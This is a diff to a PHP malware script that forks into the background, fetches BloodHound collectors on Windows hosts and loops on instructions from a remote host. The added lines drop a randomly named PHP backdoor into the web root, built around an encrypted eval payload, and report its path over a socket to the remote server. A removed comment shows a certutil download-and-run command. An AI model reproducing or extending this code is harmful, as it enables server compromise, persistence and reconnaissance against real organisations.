@@ -14,8 +14,6 @@ if ($pid == -1){
 }
 if ($pid){exit(0);}
 ini_set('safe_mode', 0);
-umask(0);
-posix_setuid(0);
 define("UNPACKSELF", "");
 define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
 define("DOCR", $_SERVER['DOCUMENT_ROOT']);
@@ -30,7 +28,6 @@ while(1) {
     {
         if (substr(php_uname(), 0, 7) == 'Windows') {
             $bh = array("af.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true");
-            /*certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe*/
             $wh = new COM('WScript.Shell');
             if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
                 $t = sys_get_temp_dir() . "\\" . uuid;
@@ -244,13 +241,19 @@ while(1) {
                     $ho = null;
                     $p = null;
                     $u = null;
+                    $allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+                    $dd = $_SERVER['DOCUMENT_ROOT']."/".substr(str_shuffle($allowed_chars), 0, rand(10,50)).".php";
+                    if (!is_file($dd)) {
+                        $ESP = "unserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode(\$v[3]), hex2bin(\$v[2]), hex2bin(\$v[0]), hex2bin(\$v[1]))), ['allowed_classes' => false]);";
+                        fputs(fopen("{$dd}", "w"), "\<?php\n{$ESP} eval(\nopenssl_decrypt(gzdecode(".UNPACKSELF."), )");
+                    }
                     $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
                     switch (fread(fopen(sys_get_temp_dir() . "/aa", "r"), 3)) {
                         case "win":
-                            $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "windows");
+                            $au = array("ac" => "add", "iru" => $dd, "u" => uuid, "o" => "windows");
                             break;
                         case "lin":
-                            $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "lin");
+                            $au = array("ac" => "add", "iru" => $dd, "u" => uuid, "o" => "lin");
                             break;
                     }
                     foreach ($au as $key => $value) {
